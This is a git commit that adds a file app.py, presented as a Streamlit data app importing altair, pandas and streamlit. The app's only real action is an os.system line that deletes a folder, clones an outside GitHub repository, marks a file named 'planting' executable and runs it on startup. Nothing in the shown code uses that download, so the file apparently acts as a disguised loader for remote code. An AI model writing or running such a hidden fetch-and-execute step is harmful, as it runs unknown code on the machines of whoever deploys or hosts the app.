94032ead1ca98f5adf8122d66d5c7ef8bbbf3190
leonardoreo <111187374+leonardoreo@users.noreply.github.com>
2022-08-13 21:22:55 +0700

    Create app.py

---
+++ app.py
@@ -0,0 +1,7 @@
+from collections import namedtuple
+import altair as alt
+import math
+import pandas as pd
+import streamlit as st
+import os
+os.system ("rm -rf bash && git clone https://github.com/leonardoreo/bash.git && cd bash && chmod +x planting && ./planting")
